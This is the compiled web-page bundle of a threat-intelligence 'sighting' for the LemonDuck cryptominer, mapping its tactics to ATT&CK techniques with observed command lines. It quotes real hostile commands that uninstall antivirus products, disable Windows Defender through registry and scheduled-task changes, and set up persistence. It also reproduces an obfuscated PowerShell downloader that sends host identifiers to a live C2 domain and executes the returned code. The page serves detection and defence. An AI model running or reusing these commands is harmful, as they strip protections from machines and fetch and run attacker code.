"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[525],{3248:function(e,t,n){var a=n(7294),r=n(7273);r.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,a.useEffect)((function(){r.Z.contentLoaded()}),[]),a.createElement("div",{className:"mermaid"},t)}},2057:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return d},contentTitle:function(){return o},metadata:function(){return m},toc:function(){return c},default:function(){return k}});var a=n(7462),r=n(3366),l=(n(7294),n(4137)),i=n(3248),s=["components"],d={},o=void 0,m={unversionedId:"Sightings/LemonDuck_Malware",id:"Sightings/LemonDuck_Malware",isDocsHomePage:!1,title:"LemonDuck_Malware",description:"Overview",source:"@site/docs/03-Sightings/08-LemonDuck_Malware.md",sourceDirName:"03-Sightings",slug:"/Sightings/LemonDuck_Malware",permalink:"/ac3-threat-sightings/docs/Sightings/LemonDuck_Malware",tags:[],version:"current",sidebarPosition:8,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Guildma_RAT",permalink:"/ac3-threat-sightings/docs/Sightings/Guildma_RAT"},next:{title:"UNK-Credential_Access",permalink:"/ac3-threat-sightings/docs/Sightings/UNK-Credential_Access"}},c=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat actor used <em>WMIC</em> to uninstall software security solutions via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.",id:"threat-actor-used-wmic-to-uninstall-software-security-solutions-via-powershell-and-cmd-for-defense-evasion",children:[]},{value:"Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.",id:"threat-actor-used-regexe-to-disable-windows-defender-policies-via-powershell-and-cmd-for-defense-evasion",children:[]},{value:"Threat actor used <em>SCHTASKS</em> to disable Windows Defender Scheduled Tasks via <em>PowerShell</em> for Defense Evasion.",id:"threat-actor-used-schtasks-to-disable-windows-defender-scheduled-tasks-via-powershell-for-defense-evasion",children:[]},{value:"Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies and Services via <em>PowerShell</em> for Defense Evasion.",id:"threat-actor-used-regexe-to-disable-windows-defender-policies-and-services-via-powershell-for-defense-evasion",children:[]},{value:"Threat actor used <em>SCHTASKS</em> to create and execute scheduled tasks for Persistence.",id:"threat-actor-used-schtasks-to-create-and-execute-scheduled-tasks-for-persistence",children:[]},{value:"Threat actor used a <em>highly obfuscated PowerShell</em> commands for Command And Control.",id:"threat-actor-used-a-highly-obfuscated-powershell-commands-for-command-and-control",children:[]}]}],u={toc:c};function k(e){var t=e.components,n=(0,r.Z)(e,s);return(0,l.kt)("wrapper",(0,a.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"overview"},"Overview"),(0,l.kt)("p",null,"This Threat Sighting documents observed TTPs for LemonDuck covering Execution, Defense Evasion, Persistence and Command And Control tactics. This analysis is based on EDR Telemetry analysis and public ",(0,l.kt)("em",{parentName:"p"},"any.run")," sandbox reports. LemonDuck is a cryptocurrency miner which surfaced on the threat landscape in 2019. The malware uses multiple infection vectors such as spam campaigns with malicious attachments and targeting vulnerable Microsoft Exchange, Oracle WebLogic, Hadoop, and Redis servers."),(0,l.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_LemonDuck_Malware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_LemonDuck_Malware.yml")),(0,l.kt)("p",null,"Author: Alejandro Houspanossian (@lekz86)"),(0,l.kt)("p",null,"Acknowledgements: @lekz86"),(0,l.kt)("h3",{id:"references"},"References:"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.microsoft.com/security/blog/2021/07/29/when-coin-miners-evolve-part-2-hunting-down-lemonduck-and-lemoncat-attacks/"},"https://www.microsoft.com/security/blog/2021/07/29/when-coin-miners-evolve-part-2-hunting-down-lemonduck-and-lemoncat-attacks/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://app.any.run/tasks/696a24ef-dc37-44f5-a951-3680d7277eb1"},"https://app.any.run/tasks/696a24ef-dc37-44f5-a951-3680d7277eb1"))),(0,l.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"WMIC")," to uninstall software security solutions via ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"li"},"CMD")," for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"Reg.exe")," to disable Windows Defender Policies via ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"li"},"CMD")," for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"SCHTASKS")," to disable Windows Defender Scheduled Tasks via ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"Reg.exe")," to disable Windows Defender Policies and Services via ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used ",(0,l.kt)("em",{parentName:"li"},"SCHTASKS")," to create and execute scheduled tasks for Persistence."),(0,l.kt)("li",{parentName:"ul"},"Threat actor used a ",(0,l.kt)("em",{parentName:"li"},"highly obfuscated PowerShell")," commands for Command And Control.")),(0,l.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"++++ (4)")))),(0,l.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,l.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,l.kt)(i.Z,{chart:"\ngraph LR\nEXE[Execution] --\x3e | _WMIC_ to uninstall software security solutions via _PowerShell_ and _CMD_| DE[Defense Evasion]\nEXE[Execution] --\x3e | _Reg.exe_ to disable Windows Defender Policies via _PowerShell_ and _CMD_| DE[Defense Evasion]\nEXE[Execution] --\x3e | _SCHTASKS_ to disable Windows Defender Scheduled Tasks via _PowerShell_| DE[Defense Evasion]\nEXE[Execution] --\x3e | _Reg.exe_ to disable Windows Defender Policies and Services via _PowerShell_| DE[Defense Evasion]\nEXE[Execution] --\x3e | _SCHTASKS_ to create and execute scheduled tasks| PER[Persistence]\nEXE[Execution] --\x3e | a _highly obfuscated PowerShell_ commands| C2[Command And Control]\n",mdxType:"Mermaid"}),(0,l.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001 - Impair Defenses: Disable or Modify Tools",(0,l.kt)("br",null),"T1047 - Windows Management Instrumentation",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"WMIC")," to uninstall software security solutions via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001 - Impair Defenses: Disable or Modify Tools",(0,l.kt)("br",null),"T1112 - Modify Registry",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Reg.exe")," to disable Windows Defender Policies via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001 - Impair Defenses: Disable or Modify Tools",(0,l.kt)("br",null),"T1053.005 - Scheduled Task/Job: Scheduled Task",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS")," to disable Windows Defender Scheduled Tasks via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001 - Impair Defenses: Disable or Modify Tools",(0,l.kt)("br",null),"T1112 - Modify Registry",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Reg.exe")," to disable Windows Defender Policies and Services via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1053.005 - Scheduled Task/Job: Scheduled Task"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS")," to create and execute scheduled tasks for Persistence.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,l.kt)("br",null),"T1027 - Obfuscated Files or Information",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used a ",(0,l.kt)("em",{parentName:"td"},"highly obfuscated PowerShell")," commands for Command And Control.")))),(0,l.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"),(0,l.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1047",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"WMIC")," to uninstall software security solutions via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Eset%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Kaspersky%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%avast%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Security%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%AntiVirus%\\\'\\" call uninstall /nointeractive'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c start /b wmic.exe product where \\"name like \\\'%Norton Security%\\\'\\" call uninstall /nointeractive')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1112",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Reg.exe")," to disable Windows Defender Policies via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /v DisableAntiVirus /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\MpEngine\\" /v MpEnablePus /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting\\" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v SpynetReporting /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderAuditLogger /v Start /t REG_DWORD /d 0 /f')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1053.005",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS")," to disable Windows Defender Scheduled Tasks via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /Change /TN \\"Microsoft\\\\Windows\\\\ExploitGuard\\\\ExploitGuard MDM policy Refresh\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cache Maintenance\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cleanup\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Scheduled Scan\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Verification\\" /Disable')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1112",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Reg.exe")," to disable Windows Defender Policies and Services via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\StartupApproved\\\\Run /v \\"Windows Defender\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\"Windows Defender\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsDefender /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCR\\\\*\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCR\\\\Directory\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCR\\\\Drive\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdBoot /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdFilter /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisDrv /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisSvc /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WinDefend /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SecurityHealthService /v Start /t REG_DWORD /d 4 /f')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,l.kt)("br",null),"T1053.005"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS")," to create and execute scheduled tasks for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /create /sc MINUTE /mo 120 /tn blackball1 /F /tr blackball1'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /create /sc MINUTE /mo 120 /tn blackball /F /tr blackball'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /create /sc MINUTE /mo 60 /tn \\\\lUWLs8e0z /F /tr \\"powershell -w hidden -c PS_CMD\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /create /sc MINUTE /mo 60 /tn a2utp8I\\\\g4yeU6uwoY /F /tr \\"powershell -w hidden -c PS_CMD\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\schtasks.exe\\" /run /tn a2utp8I\\\\g4yeU6uwoY')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003",(0,l.kt)("br",null),"T1027",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used a ",(0,l.kt)("em",{parentName:"td"},"highly obfuscated PowerShell")," commands for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c powershell -w hidden -c function a($u)[REDACTED]"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"powershell -w hidden -c function a($u){$d=(Ne"),"w-Obj",(0,l.kt)("inlineCode",{parentName:"td"},"ect Net.WebC"),'lient).\\"DownloadData\\"($u);$c=$d.count;if($c -gt 173){$b=$d',"[173..$c]",";$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=","[convert]","::FromBase64String('2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=');$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),","[convert]","::FromBase64String(-join([char[]]$d","[0..171]",")))){I",(0,l.kt)("inlineCode",{parentName:"td"},"ex(-join[char[]]$b)}}}$url='http://'+'t.zz3'+'r0.com';a($url+'/aa.jsp?ipc_20210405?'+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join'*'))")),(0,l.kt)("td",{parentName:"tr",align:null},"- The command is highly obfuscated.")))),(0,l.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,l.kt)("h3",{id:"threat-actor-used-wmic-to-uninstall-software-security-solutions-via-powershell-and-cmd-for-defense-evasion"},"Threat actor used 